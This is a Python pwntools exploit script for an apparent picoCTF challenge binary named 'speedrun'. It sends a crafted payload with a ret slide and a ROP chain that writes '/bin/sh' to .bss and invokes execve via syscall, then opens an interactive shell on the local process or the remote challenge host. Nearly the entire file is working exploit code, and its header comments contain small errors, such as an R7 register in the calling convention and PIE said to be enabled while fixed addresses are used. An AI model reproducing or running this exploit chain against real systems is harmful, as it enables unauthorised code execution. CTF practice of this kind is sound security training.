#!/usr/bin/env python3
import sys
from pwn import *
context.log_level="debug"
import time
import os
#-----------------------------------------------------------
'''
checksec checks
NX ENABLED - NO SHELLCODE ON THE STACK CAN BE EXECUTED 
PIE ENABLED - THE POSITION KEEPS CHANGING IN THE CODE (POSITION INDEPENDENT EXECUTABLE)
PARTIAL RELRO- CAN READ ONLY A FEW BYTES ALTHOUGH NOT THAT IMPORTANT
#calling conventions
 RDI,RSI,RDX,RCX,R8,R7 ...
'''
#============================#============================#============================
gdb_script='''
	b *0x400bca
'''

path="./speedrun"
def check():
	log.warning(os.system(f'file {path}'))
	log.warning(os.system(f'checksec {path}'))
	log.warning(os.system(f'ldd {path}'))

if os.path.exists("./flag.txt")==False:
	with open("flag.txt","w") as flag:
		flag.write("flag{pwned_m0T******}")
elf = context.binary=ELF(path,checksec=True)
HOST="saturn.picoctf.net"
PORT= 50266
context.binary = elf
p=process(path)
argument=sys.argv[1]
if argument=="l":
    p=process(path)
if argument=="r":
	p=remote(HOST,PORT)
if argument=='g':
	p=process(path)
	gdb.attach(p,gdbscript=gdb_script)


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.strip().ljust(4, b'\0'))
uu64    = lambda data               :u64(data.strip().ljust(8, b'\0'))
ia 		= lambda 					: p.interactive()
rl 		= lambda 					: p.recvline()
#=======================================================================================
sla("?",'257')
ret=p64(0x400416)

#the gadgets required here
binsh_hex=0x68732f6e69622f
pop_rdi=0x400686
pop_rdx=0x44c6b6
pop_rax=0x415f04
pop_rsi=0x410a93
mov_qword_ptr=0x48d301 # to write bin/sh\x00
bss=0x6b6030
syscall=0x474f15

#rop_chain
rop=flat([
	pop_rdx,
	binsh_hex,
	pop_rax,
	bss,
	mov_qword_ptr,
	pop_rax,
	0x3b,
	pop_rdi,
	bss,
	pop_rsi,
	0x00,
	pop_rdx,
	0x00,
	syscall
	])
#rop_slide calculation
rem=(256-len(rop))//8

#final_payload
payload=(ret *rem)+ rop + b"\x00"
sea("?",payload)
ia()